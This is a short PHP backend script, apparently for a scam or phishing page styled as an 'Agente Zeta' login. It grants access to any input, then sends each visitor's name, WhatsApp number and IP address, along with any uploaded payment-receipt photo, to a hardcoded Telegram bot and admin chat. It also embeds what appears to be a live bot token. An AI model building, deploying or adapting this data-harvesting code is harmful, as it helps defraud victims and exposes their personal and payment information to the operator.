<?php
session_start();
date_default_timezone_set('America/La_Paz');

$token = "7990464918:AAFPoc7EYkZsyQEOntEfF1eC6V-WyBFAkaQ";
$admin_id = "7621351319";

function getIP() {
    $ip = $_SERVER['REMOTE_ADDR'];
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) { $ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0]; }
    return $ip;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['accion'])) {
    $ip = getIP();
    
    if ($_POST['accion'] == 'login') {
        $_SESSION['zeta_auth'] = true;
        $_SESSION['agente'] = $_POST['n'];
        $_SESSION['wa'] = $_POST['w'];
        
        $msg = "🔱 *NUEVO ACCESO AGENTE ZETA*\n";
        $msg .= "👤 *NOMBRE:* `{$_POST['n']}`\n";
        $msg .= "📱 *WHATSAPP:* `{$_POST['w']}`\n";
        $msg .= "🌐 *IP:* `{$ip}`\n";
        $msg .= "⏰ *HORA:* " . date('H:i:s');
        
        file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$admin_id&text=".urlencode($msg)."&parse_mode=Markdown");
        echo "ok";
    }
    
    if ($_POST['accion'] == 'comprobante' && isset($_FILES['foto'])) {
        $agente = $_SESSION['agente'] ?? 'Anonimo';
        $caption = "📄 *COMPROBANTE DE PAGO*\n👤 *POR:* `{$agente}`\n🌐 *IP:* `{$ip}`";
        
        $post_fields = [
            'chat_id' => $admin_id,
            'photo' => new CURLFile($_FILES['foto']['tmp_name']),
            'caption' => $caption,
            'parse_mode' => 'Markdown'
        ];
        
        $ch = curl_init("https://api.telegram.org/bot$token/sendPhoto");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_exec($ch);
        curl_close($ch);
        echo "ok";
    }
    exit;
}
?>
